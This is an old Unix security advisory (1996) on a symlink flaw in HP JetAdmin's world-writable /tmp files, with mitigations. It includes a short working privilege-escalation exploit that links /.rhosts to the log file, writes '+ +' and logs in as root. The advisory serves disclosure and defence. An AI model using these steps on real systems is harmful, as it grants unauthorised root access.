r00t advisory						[ hp jetadmin   ]
							[ Aug 26 1996   ]

-- Synposis
There exists a vunerability in the hp jetadmin software that will allow any
user to obtain r00t access or arbitrarily overwrite any file on that targeted
system.  Hp jetadmin requires a user to be r00t in order to modify printer 
configurations.  Also the jetadmin software creates mode 666 files in 
/tmp/jadump and /tmp/jetadmin.log and will easily follow a symbolic link to
it's target.

-- Exploitability
The exploit is also absurdly simple:
$ ln -s /.rhosts /tmp/jetadmin.log
# wait for system administrator to manage the queue or modify printer status
$ echo "+ +" >/.rhosts
$ rlogin -l localhost root

-- Fixes ?
Some possible fixes to this problem are to use a nice dot-matrix printer 
without the jetadmin software. Or if that isn't kosher enough and you still
insist on using the jetadmin software as root:

$ cd /tmp
$ chmod +t .
$ ln -s /dev/null jetadmin.log
$ ln -s /dev/null jadump
